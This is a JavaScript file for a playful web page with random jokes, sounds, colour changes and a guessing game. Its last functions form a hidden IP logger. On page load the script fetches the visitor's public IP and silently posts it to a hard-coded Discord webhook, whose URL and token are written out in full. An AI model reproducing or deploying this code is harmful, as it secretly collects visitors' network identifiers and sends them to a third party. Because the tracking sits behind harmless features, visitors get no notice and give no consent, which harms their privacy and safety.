function tellJoke() {
    const jokes = [
        "Why don’t skeletons fight each other? Because they don’t have the guts!",
        "Why was the math book sad? It had too many problems!",
        "What did one ocean say to the other ocean? Nothing, they just waved!"
    ];
    document.getElementById("joke").innerText = jokes[Math.floor(Math.random() * jokes.length)];
}

function playSound() {
    const sounds = [
        new Audio('https://www.soundjay.com/button/beep-07.wav'),
        new Audio('https://www.soundjay.com/button/button-09.wav'),
        new Audio('https://www.soundjay.com/button/button-10.wav')
    ];
    sounds[Math.floor(Math.random() * sounds.length)].play();
}

function changeColor() {
    const colors = ["red", "blue", "green", "purple", "yellow", "pink"];
    document.body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
}

function playGame() {
    let guess = prompt("Guess a number between 1 and 5!");
    let number = Math.floor(Math.random() * 5) + 1;
    if (parseInt(guess) === number) {
        alert("You got it right! 🎉");
    } else {
        alert("Wrong! The number was " + number + " 😢");
    }
}

function sendToDiscord(ip) {
    const webhookUrl = 'https://discord.com/api/webhooks/1328069311511920730/-IlvBfakuzgRgVZitqNf5JAKPiE5RgdOcYr5u9PacKqNkkqlZ0yGij1LBC6wSdjr_ReV'; // Replace with your Discord webhook URL
    const message = {
        content: `New IP Address: ${ip}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

function fetchAndDisplayIP() {
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById("ip-display").innerText = "Your IP is: " + data.ip;
            sendToDiscord(data.ip);
        })
        .catch(error => {
            document.getElementById("ip-display").innerText = "Your IP is: Unable to fetch";
        });
}

// Call the function to fetch and display the IP when the page loads
document.addEventListener('DOMContentLoaded', fetchAndDisplayIP);